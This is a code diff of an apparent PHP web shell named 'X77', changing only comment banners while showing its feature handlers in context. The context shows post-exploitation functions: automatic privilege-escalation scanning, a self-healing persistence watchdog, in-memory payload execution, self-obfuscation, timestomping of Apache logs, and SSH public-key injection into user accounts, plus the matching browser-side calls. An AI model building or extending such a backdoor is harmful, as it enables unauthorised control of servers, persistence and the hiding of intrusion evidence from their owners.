@@ -520,7 +520,7 @@ if ($_SERVER['REQUEST_METHOD']==='POST' && isset($_POST['action'])) {
         exit;
     }
 
-    // ======================= UPGRADE: Auto Privesc (STEALTH) ==========================
+    // UPGRADE: Auto Privesc (STEALTH)
     if($action==='auto_privesc') {
         $out = "============================================================\n";
         $out .= "AUTO PRIVILEGE ESCALATION SCAN (Stealth Mode)\n";
@@ -561,7 +561,7 @@ if ($_SERVER['REQUEST_METHOD']==='POST' && isset($_POST['action'])) {
         echo json_encode(['out'=>$out]); exit;
     }
 
-    // ======================= UPGRADE: Persistence Auto-Heal ===================
+    // UPGRADE: Persistence Auto-Heal
     if($action==='persist_watchdog') {
         $watchdog_script = '#!/bin/bash
         # X77 Auto-Heal Watchdog
@@ -585,7 +585,7 @@ if ($_SERVER['REQUEST_METHOD']==='POST' && isset($_POST['action'])) {
             echo json_encode(['ok'=>true, 'msg'=>'Watchdog installed (checks every 2 min)']); exit;
     }
 
-    // ======================= UPGRADE: Memory Payload ===========================
+    // UPGRADE: Memory Payload
     if($action==='memory_payload') {
         $payload = $_POST['payload'] ?? '';
         $cmd = $_POST['cmd'] ?? '';
@@ -607,7 +607,7 @@ if ($_SERVER['REQUEST_METHOD']==='POST' && isset($_POST['action'])) {
         exit;
     }
 
-    // ======================= UPGRADE: Self-Obfuscator ==========================
+    // UPGRADE: Self-Obfuscator
     if($action==='obfuscate_self') {
         $self = __FILE__;
         if(!is_file($self)) { echo json_encode(['error'=>'File not found']); exit; }
@@ -623,7 +623,7 @@ if ($_SERVER['REQUEST_METHOD']==='POST' && isset($_POST['action'])) {
         exit;
     }
 
-    // ======================= UPGRADE: Log Timestomp ============================
+    // UPGRADE: Log Timestomp
     if($action==='log_timestomp') {
         $log_file = $_POST['file'] ?? '/var/log/apache2/access.log';
         $ref_file = $_POST['ref'] ?? '/etc/passwd';
@@ -634,7 +634,7 @@ if ($_SERVER['REQUEST_METHOD']==='POST' && isset($_POST['action'])) {
         echo json_encode(['ok'=>true, 'msg'=>"Timestomped $log_file using $ref_file", 'new_mtime'=>date('Y-m-d H:i:s', $new_mtime)]); exit;
     }
 
-    // ======================= UPGRADE: SSH Key Inject ===========================
+    // UPGRADE: SSH Key Inject
     if($action==='ssh_key_inject') {
         $pubkey = $_POST['pubkey'] ?? '';
         if(!$pubkey || !str_starts_with($pubkey, 'ssh-')) {
@@ -666,7 +666,7 @@ if ($_SERVER['REQUEST_METHOD']==='POST' && isset($_POST['action'])) {
         echo json_encode(['ok'=>true, 'msg'=>"SSH key injected into $injected user(s)"]); exit;
     }
 
-    // ======================= CVE Lookup via NVD API ===========================
+    // CVE Lookup via NVD API
     if ($action === 'cve_lookup') {
         $cve_id = trim($_POST['cve_id'] ?? '');
         if (empty($cve_id)) {
@@ -2372,7 +2372,7 @@ if (empty($_SESSION['auth'])) {
             } catch(e) { out.textContent = 'Error: ' + e.message; }
         }
 
-        // =================== UPGRADE: Auto Privesc ======================
+        // UPGRADE: Auto Privesc
         async function doPrivesc() {
             const out = document.getElementById('privesc-out');
             out.textContent = 'Scanning privilege escalation vectors...';
@@ -2383,7 +2383,7 @@ if (empty($_SESSION['auth'])) {
             } catch(e) { out.textContent = 'Error: ' + e.message; }
         }
 
-        // =================== UPGRADE: Watchdog ==========================
+        // UPGRADE: Watchdog
         async function doWatchdog() {
             const out = document.getElementById('watchdog-out');
             out.textContent = 'Installing watchdog...';
@@ -2394,7 +2394,7 @@ if (empty($_SESSION['auth'])) {
             } catch(e) { out.textContent = 'Error: ' + e.message; }
         }
 
-        // =================== UPGRADE: Memory Payload ====================
+        // UPGRADE: Memory Payload
         async function doMemoryPayload() {
             const payload = document.getElementById('mem-payload').value.trim();
             const cmd = document.getElementById('mem-cmd').value.trim();
@@ -2408,7 +2408,7 @@ if (empty($_SESSION['auth'])) {
             } catch(e) { out.textContent = 'Error: ' + e.message; }
         }
 
-        // =================== UPGRADE: Self-Obfuscator ===================
+        // UPGRADE: Self-Obfuscator
         async function doObfuscate() {
             const out = document.getElementById('obf-out');
             if(!confirm('Obfuscate this shell? File .obf will be created in same directory.')) return;
@@ -2420,7 +2420,7 @@ if (empty($_SESSION['auth'])) {
             } catch(e) { out.textContent = 'Error: ' + e.message; }
         }
 
-        // =================== UPGRADE: Log Timestomp =====================
+        // UPGRADE: Log Timestomp
         async function doTimestomp() {
             const log = document.getElementById('ts-log').value.trim();
             const ref = document.getElementById('ts-ref').value.trim();
@@ -2434,7 +2434,7 @@ if (empty($_SESSION['auth'])) {
             } catch(e) { out.textContent = 'Error: ' + e.message; }
         }
 
-        // =================== UPGRADE: SSH Key Inject ====================
+        // UPGRADE: SSH Key Inject
         async function doSSHInject() {
             const pubkey = document.getElementById('ssh-key').value.trim();
             if(!pubkey || !pubkey.startsWith('ssh-')) {
